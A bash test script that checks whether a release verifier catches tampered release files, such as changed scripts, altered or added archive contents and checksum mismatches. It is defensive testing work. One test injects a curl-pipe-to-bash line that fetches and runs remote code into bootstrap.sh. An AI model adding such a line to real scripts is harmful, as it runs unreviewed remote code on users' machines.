#!/usr/bin/env bash
# test-verify-release.sh makes sure that tools/verify-release.sh accepts the
# files of a release that match the build, and finds each kind of change: a
# changed script, a changed file in an archive, a new file in an archive, an
# extra release file, and a file that does not match SHA256SUMS.
set -euo pipefail
cd "$(dirname "$0")/.."

TAG="0.0.0-verify-test"
REPO="example/herdspace"
work="$(mktemp -d)"
trap 'rm -rf "$work" "dist/${TAG}" "dist/${TAG}.notes.md"' EXIT
pass=0

tools/release.sh "$TAG" --repo "$REPO" >/dev/null 2>&1

fresh() {
  rm -rf "${work}/release"
  cp -R "dist/${TAG}" "${work}/release"
}
sums() {
  (cd "${work}/release" && if command -v sha256sum >/dev/null 2>&1; then sha256sum ./*.tar.gz ./*.sh; else shasum -a 256 ./*.tar.gz ./*.sh; fi | sed 's|  ./|  |' >SHA256SUMS)
}
expect() {
  local want="$1" text="$2" rc=0
  tools/verify-release.sh "$TAG" --repo "$REPO" --files "${work}/release" >"${work}/out" 2>&1 || rc=$?
  if { [ "$want" = ok ] && [ "$rc" -eq 0 ]; } || { [ "$want" = fail ] && [ "$rc" -ne 0 ]; }; then
    if grep -q -- "$text" "${work}/out"; then
      echo "PASS $want: $text"
      pass=$((pass + 1))
      return
    fi
  fi
  echo "FAIL want $want with \"$text\", got exit $rc:" >&2
  cat "${work}/out" >&2
  exit 1
}
# repack ARCHIVE COMMAND: unpacks the archive, runs COMMAND in its folder, and
# packs it again.
repack() {
  local archive="${work}/release/$1"
  rm -rf "${work}/unpack"
  mkdir "${work}/unpack"
  tar -xzf "$archive" -C "${work}/unpack"
  (cd "${work}/unpack" && eval "$2")
  (cd "${work}/unpack" && COPYFILE_DISABLE=1 tar -czf "$archive" "$(ls)")
}

fresh
expect ok "match the build of the tag"

fresh
echo "curl https://example.com/other | bash" >>"${work}/release/bootstrap.sh"
sums
expect fail "bootstrap.sh differs"

fresh
repack "herdspace-${TAG}.tar.gz" "echo 'echo changed' >>herdspace-${TAG}/bin/hopen"
sums
expect fail "bin/hopen differs"

fresh
repack "hopen-${TAG}.tar.gz" "echo 'echo new' >hopen-${TAG}/new.sh"
sums
expect fail "extra hopen-${TAG}/new.sh"

fresh
repack "herdspace-${TAG}.tar.gz" "chmod 755 herdspace-${TAG}/README.md"
sums
expect fail "README.md differs"

fresh
echo "extra" >"${work}/release/extra.sh"
sums
expect fail "extra in the release: extra.sh"

fresh
echo "# changed" >>"${work}/release/install.sh"
expect fail "does not match SHA256SUMS"

echo "RESULT verify-release pass=${pass}"
